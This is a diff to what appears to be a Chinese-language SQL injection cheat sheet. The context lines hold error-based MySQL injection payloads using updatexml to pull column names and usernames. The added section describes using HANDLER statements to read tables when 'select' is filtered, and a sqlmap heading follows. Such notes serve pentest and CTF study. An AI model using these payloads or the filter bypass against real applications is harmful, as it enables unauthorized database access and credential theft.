@@ -95,6 +95,21 @@ id=-1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from inform
 id=-1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)%23
 ```
 
+过滤select--&gt;采用handler进行注入
+
+```
+HANDLER tbl_name OPEN [ [AS] alias]
+
+HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ { FIRST | NEXT }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+HANDLER tbl_name CLOSE
+```
+
 * ### SQLMAP
 
 sqlmap语句
